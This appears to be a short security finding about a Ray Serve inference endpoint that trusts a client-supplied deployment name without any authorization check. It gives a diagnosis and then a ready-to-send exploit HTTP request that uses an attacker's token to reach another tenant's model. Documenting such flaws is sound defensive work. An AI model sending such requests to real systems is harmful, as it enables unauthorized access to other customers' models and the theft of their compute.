diagnosis: The Ray Serve prediction endpoint resolves application deployment handles using a client-supplied deployment_name string. It performs no authorization check to determine if the caller has rights to invoke that specific Ray Serve replica. An attacker can send inference requests to proprietary, specialized, or customer-isolated model deployments, consuming expensive compute and accessing proprietary fine-tunes.
exploit_request:
POST /inference/ray-serve/predict HTTP/1.1
Host: ml-serve.platform.net
Authorization: Bearer <attacker_jwt>
Content-Type: application/json

{"deployment_name": "tenant_defense_contractor_llm", "prompt": "Summarize secure radar spec", "max_tokens": 256}
